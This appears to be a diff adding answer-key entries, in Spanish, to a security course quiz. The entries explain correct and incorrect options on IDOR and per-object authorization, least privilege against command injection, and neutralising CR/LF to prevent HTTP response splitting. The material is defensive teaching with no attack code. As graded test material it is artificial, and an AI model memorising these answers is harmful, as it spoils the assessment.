+      "reasoning": "Cambiar el número de factura y ver la de otro es un IDOR. El servidor debe comprobar que el usuario tiene permiso sobre esa factura concreta, no solo que esté autenticado o que el número sea válido.",
+      "options": {
+        "a": "Correcta. El servidor debe comprobar que el usuario tiene permiso sobre ese objeto concreto.",
+        "b": "Incorrecta. Validar el formato no sustituye a la autorización: un número válido puede ser de otro cliente.",
+        "c": "Incorrecta. Una sesión autenticada cualquiera no prueba que la factura sea suya.",
+        "d": "Incorrecta. Que la factura exista no dice nada de quién puede verla."
+      }
+    },
+    "sistemas-t03-29": {
+      "section": "comandos",
+      "reasoning": "El principio de mínimo privilegio no evita la inyección, pero si ocurre, el comando inyectado solo puede hacer lo que permiten los escasos permisos de la aplicación. Por eso reduce el impacto.",
+      "options": {
+        "a": "Incorrecta. Ejecutar con máximos permisos agranda el daño de una inyección.",
+        "b": "Incorrecta. Confiar en que el formulario es interno no protege: la entrada puede manipularse.",
+        "c": "Incorrecta. Una cuenta compartida extiende el daño a todos los servicios.",
+        "d": "Correcta. Ejecutar con mínimos privilegios limita lo que puede hacer un comando inyectado."
+      }
+    },
+    "sistemas-t03-30": {
+      "section": "response-splitting",
+      "reasoning": "Si los datos del usuario acaban en una cabecera de respuesta, el peligro es HTTP response splitting: el atacante cuela retornos de carro y saltos de línea para crear cabeceras o respuestas nuevas. Hay que controlar esos caracteres, que alteran la estructura de las cabeceras.",
+      "options": {
+        "a": "Incorrecta. El problema está en las cabeceras, no en el formato del cuerpo de la página.",
+        "b": "Incorrecta. La sesión no impide la inyección de CR LF en las cabeceras.",
+        "c": "Correcta. Hay que neutralizar los caracteres (CR y LF) que pueden alterar la estructura de las cabeceras.",
+        "d": "Incorrecta. El nombre visible del recurso no tiene que ver con la estructura de las cabeceras."
+      }
+    }
+  }
+}
